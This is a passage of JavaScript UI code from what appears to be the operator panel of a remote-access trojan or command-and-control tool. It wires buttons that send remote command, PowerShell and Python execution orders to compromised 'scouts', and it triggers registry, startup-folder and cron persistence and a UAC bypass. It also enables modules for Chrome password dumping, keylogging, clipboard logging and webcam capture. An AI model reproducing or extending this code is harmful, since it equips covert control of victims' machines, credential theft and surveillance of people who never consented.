            $("#input_direct_components_win_uploadFile").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory");
            scrollToTop();
        }
    });

    $("#button_direct_classify_lin_write_uploadFile").click(function () {
        displaySelectedFunctions("write");
        displayComponents("uploadFile");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_uploadFile").click(function () {
        if ($("#input_direct_components_lin_uploadFile").val() !== "") {
            $(".input_console_command").last().val("upload " + $("#input_direct_components_lin_uploadFile").val(), true);
            triggerAjaxDirectInterface("upload " + $("#input_direct_components_lin_uploadFile").val(), true, logOutputCB, undefined);
            $("#input_direct_components_lin_uploadFile").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory");
            scrollToTop();
        }
    });



    $("#button_direct_classify_win_write_wallpaperChanger").click(function () {
        displaySelectedFunctions("write");
        displayComponents("wallpaperChanger");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_wallpaperChanger").click(function () {
        if ($("#input_direct_components_win_wallpaperChanger").val() !== "") {
            $(".input_console_command").last().val("wallpaper " + $("#input_direct_components_win_wallpaperChanger").val(), true);
            triggerAjaxDirectInterface("wallpaper " + $("#input_direct_components_win_wallpaperChanger").val(), true, logOutputCB, undefined);
            $("#input_direct_components_win_wallpaperChanger").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory");
            scrollToTop();
        }
    });



    $(document).on('keypress, keydown', '.singleline', function(event) {
        if (this.selectionStart < ScoutGlobals.readOnlyLength) {
            document.getElementById($(this).attr('id')).selectionStart = $(this).val().length;
            document.getElementById($(this).attr('id')).selectionEnd = $(this).val().length;
        }
        if (event.which === 37) {
            if (this.selectionStart === ScoutGlobals.readOnlyLength) {
                return false;
            }
        } else if (event.which === 8) {
            if (this.selectionStart !== this.selectionEnd) {
                return this.selectionStart >= ScoutGlobals.readOnlyLength - 1;
            } else {
                if (this.selectionStart === ScoutGlobals.readOnlyLength) {
                    return false;
                }
            }
        } else if (event.which === 13 || event.which === 40 || event.which === 38) {
            return false;
        } else {
            return this.selectionStart >= ScoutGlobals.readOnlyLength;
        }
    });
    $(document).on('keypress, keydown', '.multiline', function(event) {
        if (this.selectionStart < ScoutGlobals.readOnlyLength) {
            document.getElementById($(this).attr('id')).selectionStart = $(this).val().length;
            document.getElementById($(this).attr('id')).selectionEnd = $(this).val().length;
        }
        if (event.which === 37) {
            if (this.selectionStart === ScoutGlobals.readOnlyLength) {
                return false;
            }
        } else if (event.which === 8) {
            if (this.selectionStart !== this.selectionEnd) {
                return this.selectionStart >= ScoutGlobals.readOnlyLength - 1;
            } else {
                if (this.selectionStart === ScoutGlobals.readOnlyLength) {
                    if ($(this).attr('id').split("_")[7] !== "0") {
                        let $selector;
                        if (ScoutGlobals.scoutOS === "win") {
                            $selector = $("#input_direct_components_win_python_command_input_" + (parseInt($(this).attr('id').split("_")[7], 10) - 1).toString());
                        } else if (ScoutGlobals.scoutOS === "lin") {
                            $selector = $("#input_direct_components_lin_python_command_input_" + (parseInt($(this).attr('id').split("_")[7], 10) - 1).toString());
                        }
                        let valueOfDeletable = $(this).val().slice(ScoutGlobals.readOnlyLength);
                        let pointerLocationToSet = $selector.val().length;
                        deleteInputRow(parseInt($(this).attr('id').split("_")[7], 10));
                        $selector.val($selector.val() + valueOfDeletable);
                        $selector.focus();
                        document.getElementById($selector.attr('id')).selectionStart = pointerLocationToSet;
                        document.getElementById($selector.attr('id')).selectionEnd = pointerLocationToSet;
                        return false;
                    } else {
                        return false;
                    }
                }
            }
        } else if (event.which === 13) {
            let valueOfEnterable = $(this).val().slice(this.selectionStart);
            $(this).val($(this).val().slice(0, this.selectionStart));
            insertInputRow(parseInt($(this).attr('id').split("_")[7], 10));
            let $selector;
            if (ScoutGlobals.scoutOS === "win") {
                $selector = $("#input_direct_components_win_python_command_input_" + (parseInt($(this).attr('id').split("_")[7], 10) + 1).toString());
            } else if (ScoutGlobals.scoutOS === "lin") {
                $selector = $("#input_direct_components_lin_python_command_input_" + (parseInt($(this).attr('id').split("_")[7], 10) + 1).toString());
            }
            $selector.val(">>> " + valueOfEnterable);
            $selector.focus();
            document.getElementById($selector.attr('id')).selectionStart = ScoutGlobals.readOnlyLength;
            document.getElementById($selector.attr('id')).selectionEnd = ScoutGlobals.readOnlyLength;
            return false;
        } else if (event.which === 40) {
            if (ScoutGlobals.scoutOS === "win") {
                if (parseInt($(this).attr('id').split("_")[7], 10) < $("#div_direct_components_win_python_command_input").children().length - 1) {
                    let pos = this.selectionStart;
                    let $selector = $("#input_direct_components_win_python_command_input_" + (parseInt($(this).attr('id').split("_")[7], 10) + 1).toString());
                    $selector.focus();
                    document.getElementById($selector.attr('id')).selectionStart = pos;
                    document.getElementById($selector.attr('id')).selectionEnd = pos;
                }
            } else if (ScoutGlobals.scoutOS === "lin") {
                if (parseInt($(this).attr('id').split("_")[7], 10) < $("#div_direct_components_lin_python_command_input").children().length - 1) {
                    let pos = this.selectionStart;
                    let $selector = $("#input_direct_components_lin_python_command_input_" + (parseInt($(this).attr('id').split("_")[7], 10) + 1).toString());
                    $selector.focus();
                    document.getElementById($selector.attr('id')).selectionStart = pos;
                    document.getElementById($selector.attr('id')).selectionEnd = pos;
                }
            }
            return false;
        } else if (event.which === 38) {
            if (parseInt($(this).attr('id').split("_")[7], 10) > 0) {
                let pos = this.selectionStart;
                let $selector;
                if (ScoutGlobals.scoutOS === "win") {
                    $selector = $("#input_direct_components_win_python_command_input_" + (parseInt($(this).attr('id').split("_")[7], 10) - 1).toString());
                } else if (ScoutGlobals.scoutOS === "lin") {
                    $selector = $("#input_direct_components_lin_python_command_input_" + (parseInt($(this).attr('id').split("_")[7], 10) - 1).toString());
                }
                $selector.focus();
                document.getElementById($selector.attr('id')).selectionStart = pos;
                document.getElementById($selector.attr('id')).selectionEnd = pos;
            }
            return false;
        } else {
            return this.selectionStart >= ScoutGlobals.readOnlyLength;
        }
    });
    $(document).on('mousedown mouseup', '.multiline', function() {
        if (this.selectionStart < ScoutGlobals.readOnlyLength) {
            document.getElementById($(this).attr('id')).selectionStart = ScoutGlobals.readOnlyLength;
            document.getElementById($(this).attr('id')).selectionEnd = ScoutGlobals.readOnlyLength;
        }
    });
    $(document).on('mousedown mouseup', '.singleline', function() {
        if (this.selectionStart < ScoutGlobals.readOnlyLength) {
            document.getElementById($(this).attr('id')).selectionStart = ScoutGlobals.readOnlyLength;
            document.getElementById($(this).attr('id')).selectionEnd = ScoutGlobals.readOnlyLength;
        }
    });
    function deleteInputRow(rowId) {
        if (ScoutGlobals.scoutOS === "win") {
            $("#input_direct_components_win_python_command_input_" + rowId.toString()).remove();
            for (let i = rowId + 1; i <= $("#div_direct_components_win_python_command_input").children().length; i++) {
                $("#input_direct_components_win_python_command_input_" + i.toString()).attr('id', "input_direct_components_win_python_command_input_" + (i - 1).toString());
            }
        } else if (ScoutGlobals.scoutOS === "lin") {
            $("#input_direct_components_lin_python_command_input_" + rowId.toString()).remove();
            for (let i = rowId + 1; i <= $("#div_direct_components_lin_python_command_input").children().length; i++) {
                $("#input_direct_components_lin_python_command_input_" + i.toString()).attr('id', "input_direct_components_lin_python_command_input_" + (i - 1).toString());
            }
        }
    }
    function insertInputRow(rowId) {
        if (ScoutGlobals.scoutOS === "win") {
            for (let i = $("#div_direct_components_win_python_command_input").children().length - 1; i > rowId; i--) {
                $("#input_direct_components_win_python_command_input_" + i.toString()).attr('id', "input_direct_components_win_python_command_input_" + (i + 1).toString());
            }
            $("#div_direct_components_win_python_command_input").insertAt(rowId + 1, "<input type='text' id='input_direct_components_win_python_command_input_" + (rowId + 1).toString() + "' class='multiline command_input' name='Python' value='>>> ' style='width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0 !important; margin: 0 !important;' autocomplete='off'>");
        } else if (ScoutGlobals.scoutOS === "lin") {
            for (let i = $("#div_direct_components_lin_python_command_input").children().length - 1; i > rowId; i--) {
                $("#input_direct_components_lin_python_command_input_" + i.toString()).attr('id', "input_direct_components_lin_python_command_input_" + (i + 1).toString());
            }
            $("#div_direct_components_lin_python_command_input").insertAt(rowId + 1, "<input type='text' id='input_direct_components_lin_python_command_input_" + (rowId + 1).toString() + "' class='multiline command_input' name='Python' value='>>> ' style='width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0 !important; margin: 0 !important;' autocomplete='off'>");
        }
    }
    jQuery.fn.insertAt = function(index, element) {
        let lastIndex = this.children().length;
        if (index < 0) {
            index = Math.max(0, lastIndex + 1 + index);
        }
        this.append(element);
        if (index < lastIndex) {
            this.children().eq(index).before(this.children().last());
        }
        return this;
    };



    $("#button_direct_classify_win_execute_CMD").click(function () {
        displaySelectedFunctions("execute");
        displayComponents("CMD");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_CMD").click(function () {
        if ($("#input_direct_components_win_CMD").val().slice(ScoutGlobals.readOnlyLength) !== "") {
            $(".input_console_command").last().val("exec_c " + $("#input_direct_components_win_CMD").val().slice(ScoutGlobals.readOnlyLength), true);
            triggerAjaxDirectInterface("exec_c " + $("#input_direct_components_win_CMD").val().slice(ScoutGlobals.readOnlyLength), true, logOutputCB, undefined);
            $("#input_direct_components_win_CMD").val(">>> ");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a command");
            scrollToTop();
        }
    });



    $("#button_direct_classify_lin_execute_bash").click(function () {
        displaySelectedFunctions("execute");
        displayComponents("bash");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_bash").click(function () {
        if ($("#input_direct_components_lin_bash").val().slice(ScoutGlobals.readOnlyLength) !== "") {
            $(".input_console_command").last().val("exec_b " + $("#input_direct_components_lin_bash").val().slice(ScoutGlobals.readOnlyLength), true);
            triggerAjaxDirectInterface("exec_b " + $("#input_direct_components_lin_bash").val().slice(ScoutGlobals.readOnlyLength), true, logOutputCB, undefined);
            $("#input_direct_components_lin_bash").val(">>> ");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a command");
            scrollToTop();
        }
    });



    $("#button_direct_classify_win_execute_powershell").click(function () {
        displaySelectedFunctions("execute");
        displayComponents("powershell");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_powershell").click(function () {
        if ($("#input_direct_components_win_powershell").val().slice(ScoutGlobals.readOnlyLength) !== "") {
            $(".input_console_command").last().val("exec_p " + $("#input_direct_components_win_powershell").val().slice(ScoutGlobals.readOnlyLength), true);
            triggerAjaxDirectInterface("exec_p " + $("#input_direct_components_win_powershell").val().slice(ScoutGlobals.readOnlyLength), true, logOutputCB, undefined);
            $("#input_direct_components_win_powershell").val(">>> ");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a command");
            scrollToTop();
        }
    });



    $("#button_direct_classify_win_execute_file").click(function () {
        displaySelectedFunctions("execute");
        displayComponents("file");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_file").click(function () {
        if ($("#input_direct_components_win_file").val() !== "") {
            $(".input_console_command").last().val("exec_f " + $("#input_direct_components_win_file").val(), true);
            triggerAjaxDirectInterface("exec_f " + $("#input_direct_components_win_file").val(), true, logOutputCB, undefined);
            $("#input_direct_components_win_file").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory");
            scrollToTop();
        }
    });



    $("#button_direct_classify_win_execute_python").click(function () {
        displaySelectedFunctions("execute");
        displayComponents("python");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
        $("#div_direct_components_win_python_command_input").html("You are currently in the python executor scripter, script a chain of python instructions to run, press execute to run (only works if python execute component is loaded)<input type='text' id='input_direct_components_win_python_command_input_0' class='multiline command_input' name='Python' value='>>> ' style='width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0 !important; margin: 0 !important;' autocomplete='off'>");
    });
    $("#button_direct_components_win_python_file").click(function () {
        if ($("#input_direct_components_win_python_file").val() !== "") {
            $(".input_console_command").last().val("exec_py_file " + $("#input_direct_components_win_python_file").val(), true);
            triggerAjaxDirectInterface("exec_py_file " + $("#input_direct_components_win_python_file").val(), true, logOutputCB, undefined);
            $("#input_direct_components_win_python_file").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory");
            scrollToTop();
        }
    });
    $("#button_direct_components_win_python_command").click(function () {
        let pythonProgram = "";
        $(".multiline").each(function () {
            pythonProgram = pythonProgram + $(this).val().slice(ScoutGlobals.readOnlyLength) + "\n";
        });
        $(".input_console_command").last().val("exec_py " + pythonProgram, true);
        triggerAjaxDirectInterface("exec_py " + pythonProgram, true, logOutputCB, undefined);
    });

    $("#button_direct_classify_lin_execute_python").click(function () {
        displaySelectedFunctions("execute");
        displayComponents("python");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
        $("#div_direct_components_lin_python_command_input").html("You are currently in the python executor scripter, script a chain of python instructions to run, press execute to run (only works if python execute component is loaded)<input type='text' id='input_direct_components_lin_python_command_input_0' class='multiline command_input' name='Python' value='>>> ' style='width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0 !important; margin: 0 !important;' autocomplete='off'>");
    });
    $("#button_direct_components_lin_python_file").click(function () {
        if ($("#input_direct_components_lin_python_file").val() !== "") {
            $(".input_console_command").last().val("exec_py_file " + $("#input_direct_components_lin_python_file").val(), true);
            triggerAjaxDirectInterface("exec_py_file " + $("#input_direct_components_lin_python_file").val(), true, logOutputCB, undefined);
            $("#input_direct_components_lin_python_file").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory");
            scrollToTop();
        }
    });
    $("#button_direct_components_lin_python_command").click(function () {
        let pythonProgram = "";
        $(".multiline").each(function () {
            pythonProgram = pythonProgram + $(this).val().slice(ScoutGlobals.readOnlyLength) + "\n";
        });
        $(".input_console_command").last().val("exec_py " + pythonProgram, true);
        triggerAjaxDirectInterface("exec_py " + pythonProgram, true, logOutputCB, undefined);
    });



    $("#button_direct_classify_win_persist_registryPersistence").click(function () {
        displaySelectedFunctions("persist");
        displayComponents("registryPersistence");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_registryPersistence").click(function () {
        $(".input_console_command").last().val("reg_persist");
        triggerAjaxDirectInterface("reg_persist", true, logOutputCB, undefined);
    });



    $("#button_direct_classify_win_persist_sdcltUACBypass").click(function () {
        displaySelectedFunctions("persist");
        displayComponents("sdcltUACBypass");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_sdcltUACBypass").click(function () {
        if ($("#input_direct_components_win_sdcltUACBypass").val() !== "") {
            $(".input_console_command").last().val("sdclt_uac " + $("#input_direct_components_win_sdcltUACBypass").val(), true);
            triggerAjaxDirectInterface("sdclt_uac " + $("#input_direct_components_win_sdcltUACBypass").val(), true, logOutputCB, undefined);
            $("#input_direct_components_win_sdcltUACBypass").val("");
        } else {
            ScoutGlobals.error = true;
            showMessage("Please enter a valid directory");
            scrollToTop();
        }
    });



    $("#button_direct_classify_win_persist_startupFolderPersistence").click(function () {
        displaySelectedFunctions("persist");
        displayComponents("startupFolderPersistence");
        $("#button_direct_components_win_back").show();
        $("#div_direct_classify_win").hide();
    });
    $("#button_direct_components_win_startupFolderPersistence").click(function () {
        $(".input_console_command").last().val("startup_persist");
        triggerAjaxDirectInterface("startup_persist", true, logOutputCB, undefined);
    });



    $("#button_direct_classify_lin_persist_cronJobPersistence").click(function () {
        displaySelectedFunctions("persist");
        displayComponents("registryPersistence");
        $("#button_direct_components_lin_back").show();
        $("#div_direct_classify_lin").hide();
    });
    $("#button_direct_components_lin_cronJobPersistence").click(function () {
        $(".input_console_command").last().val("cron_persist");
        triggerAjaxDirectInterface("cron_persist", true, logOutputCB, undefined);
    });



    $(document).on('focus', ".input_console_command", function() {
        $(document).off('keypress, keydown', '.input_console_command');
        $(document).on('keypress, keydown', '.input_console_command', function(event) {
            if (event.which === 13) {
                event.preventDefault();
                $(this).attr("readonly", true);
                let val = $(this).val();
                if (val === "ping" || val === "disconnect" || val === "kill" || val.split(" ")[0] === "sleep"){
                    triggerAjaxDirectInterface(val, true, logOutputCB, {"command": val});
                } else if (val === "help" || val === "?") {
                    triggerAjaxDirectInterface("help_command", true, logOutputCB, {"command": "help_command"});
                } else {
                    triggerAjaxDirectInterface(val, true, logOutputCB, undefined);
                }
            }
        });
    });

    // SCOUT FUNCTIONS !!

    // Spinner handler for scout mode
    function loader(toLoad) {
        if (toLoad === "0") {
            $("#i_scouts_table_bridge_0_spinner").show();
        }
        else {
            $("#i_scouts_table_bridge_0_spinner").hide();
        }
        if (toLoad === "1") {
            $("#i_scouts_table_disconnect_1_spinner").show();
        }
        else {
            $("#i_scouts_table_disconnect_1_spinner").hide();
        }
        if (toLoad === "2") {
            $("#i_scouts_table_kill_2_spinner").show();
        }
        else {
            $("#i_scouts_table_kill_2_spinner").hide();
        }
        if (toLoad === "3") {
            $("#i_scouts_table_ping_3_spinner").show();
        }
        else {
            $("#i_scouts_table_ping_3_spinner").hide();
        }
        if (toLoad === "4") {
            $("#i_scouts_table_sleep_4_spinner").show();
        }
        else {
            $("#i_scouts_table_sleep_4_spinner").hide();
        }
    }


    // DIRECT FUNCTIONS !!

    // Switch to scout interface in case of error
    function switchToScoutIFC() {
        ScoutGlobals.ifc = "Scouts";
    }

    // Spinner handler for direct mode
    function loaderDirect(toLoad) {
        if (ScoutGlobals.scoutOS === "win") {
            if (toLoad === "0") {
                $("#i_direct_classify_win_base_disconnect_0_spinner").show();
            } else {
                $("#i_direct_classify_win_base_disconnect_0_spinner").hide();
            }
            if (toLoad === "1") {
                $("#i_direct_classify_win_base_kill_1_spinner").show();
            } else {
                $("#i_direct_classify_win_base_kill_1_spinner").hide();
            }
            if (toLoad === "2") {
                $("#i_direct_classify_win_base_ping_2_spinner").show();
            } else {
                $("#i_direct_classify_win_base_ping_2_spinner").hide();
            }
            if (toLoad === "3") {
                $("#i_direct_classify_win_base_sleep_3_spinner").show();
            } else {
                $("#i_direct_classify_win_base_sleep_3_spinner").hide();
            }
        } else if (ScoutGlobals.scoutOS === "lin") {
            if (toLoad === "0") {
                $("#i_direct_classify_lin_base_disconnect_0_spinner").show();
            } else {
                $("#i_direct_classify_lin_base_disconnect_0_spinner").hide();
            }
            if (toLoad === "1") {
                $("#i_direct_classify_lin_base_kill_1_spinner").show();
            } else {
                $("#i_direct_classify_lin_base_kill_1_spinner").hide();
            }
            if (toLoad === "2") {
                $("#i_direct_classify_lin_base_ping_2_spinner").show();
            } else {
                $("#i_direct_classify_lin_base_ping_2_spinner").hide();
            }
            if (toLoad === "3") {
                $("#i_direct_classify_lin_base_sleep_3_spinner").show();
            } else {
                $("#i_direct_classify_lin_base_sleep_3_spinner").hide();
            }
        }
    }

    // Appropriately color all available and unavailable functions
    function highlightAvailableFunctions(l) {
        let c = "#e74856";
        if (jQuery.inArray("windows/bases/bind_tcp_base", l) > -1 || jQuery.inArray("windows/bases/reverse_tcp_base", l) > -1) {
            ScoutGlobals.scoutOS = "win";
            if (jQuery.inArray("windows/control/active_windows_dump", l) > -1) {
                $("#button_direct_classify_win_read_activeWindowsDump").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_read_activeWindowsDump").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/check_admin", l) > -1) {
                $("#button_direct_classify_win_read_checkAdmin").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_read_checkAdmin").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/chrome_password_dump", l) > -1) {
                $("#button_direct_classify_win_read_chromePasswordDump").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_read_chromePasswordDump").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/clip_logger", l) > -1) {
                $("#button_direct_classify_win_read_clipLogger").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_read_clipLogger").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/download_file", l) > -1) {
                $("#button_direct_classify_win_read_downloadFile").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_read_downloadFile").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/download_web", l) > -1) {
                $("#button_direct_classify_win_read_downloadWeb").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_read_downloadWeb").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/get_idle", l) > -1) {
                $("#button_direct_classify_win_read_getIdle").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_read_getIdle").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/in_memory_screenshot", l) > -1) {
                $("#button_direct_classify_win_read_screenshot").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_read_screenshot").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/in_memory_webcam", l) > -1) {
                $("#button_direct_classify_win_read_webcam").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_read_webcam").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("windows/control/key_and_window_logger", l) > -1) {
                $("#button_direct_classify_win_read_logger").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_read_logger").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("windows/control/system_info_grabber", l) > -1) {
                $("#button_direct_classify_win_read_systemInfo").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_read_systemInfo").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("windows/control/browser", l) > -1) {
                $("#button_direct_classify_win_write_browser").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_write_browser").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/inject_keystrokes", l) > -1) {
                $("#button_direct_classify_win_write_injectKeystrokes").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_write_injectKeystrokes").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/interface_lock", l) > -1) {
                $("#button_direct_classify_win_write_interfaceLock").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_write_interfaceLock").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/set_audio", l) > -1) {
                $("#button_direct_classify_win_write_setAudio").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_write_setAudio").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/system_status_change", l) > -1) {
                $("#button_direct_classify_win_write_systemStatusChange").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_write_systemStatusChange").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("windows/control/upload_file", l) > -1) {
                $("#button_direct_classify_win_write_uploadFile").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_write_uploadFile").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("windows/control/wallpaper_changer", l) > -1) {
                $("#button_direct_classify_win_write_wallpaperChanger").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_write_wallpaperChanger").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("windows/control/execute_command_cmd", l) > -1) {
                $("#button_direct_classify_win_execute_CMD").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_execute_CMD").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/execute_command_powershell", l) > -1) {
                $("#button_direct_classify_win_execute_powershell").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_execute_powershell").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/execute_command_file", l) > -1) {
                $("#button_direct_classify_win_execute_file").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_execute_file").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/execute_file", l) > -1) {
                $("#button_direct_classify_win_execute_file").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_execute_file").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/execute_python", l) > -1) {
                $("#button_direct_classify_win_execute_python").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_execute_python").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 23% !important;")
            }

            if (jQuery.inArray("windows/control/registry_persistence", l) > -1) {
                $("#button_direct_classify_win_persist_registryPersistence").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_persist_registryPersistence").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("windows/control/sdclt_uac_bypass", l) > -1) {
                $("#button_direct_classify_win_persist_sdcltUACBypass").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_persist_sdcltUACBypass").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("windows/control/startup_folder_persistence", l) > -1) {
                $("#button_direct_classify_win_persist_startupFolderPersistence").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_win_persist_startupFolderPersistence").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }
        }
        else if (jQuery.inArray("linux/bases/bind_tcp_base", l) > -1 || jQuery.inArray("linux/bases/reverse_tcp_base", l) > -1) {
            ScoutGlobals.scoutOS = "lin";
            if (jQuery.inArray("linux/control/active_windows_dump", l) > -1) {
                $("#button_direct_classify_lin_read_activeWindowsDump").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_read_activeWindowsDump").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("linux/control/check_admin", l) > -1) {
                $("#button_direct_classify_lin_read_checkAdmin").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_read_checkAdmin").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("linux/control/clip_logger", l) > -1) {
                $("#button_direct_classify_lin_read_clipLogger").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_read_clipLogger").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("linux/control/download_file", l) > -1) {
                $("#button_direct_classify_lin_read_downloadFile").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_read_downloadFile").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("linux/control/download_web", l) > -1) {
                $("#button_direct_classify_lin_read_downloadWeb").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_read_downloadWeb").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("linux/control/in_memory_screenshot", l) > -1) {
                $("#button_direct_classify_lin_read_screenshot").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_read_screenshot").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("linux/control/in_memory_webcam", l) > -1) {
                $("#button_direct_classify_lin_read_webcam").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_read_webcam").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("linux/control/key_and_window_logger", l) > -1) {
                $("#button_direct_classify_lin_read_logger").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_read_logger").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("linux/control/system_info_grabber", l) > -1) {
                $("#button_direct_classify_lin_read_systemInfo").prop('disabled', false).css("background-color", "#2f3136");
            } else {
                $("#button_direct_classify_lin_read_systemInfo").prop('disabled', true).attr("style", "background-color: " + c + " !important; width: 31.3% !important;")
            }

            if (jQuery.inArray("linux/control/inject_keystrokes", l) > -1) {
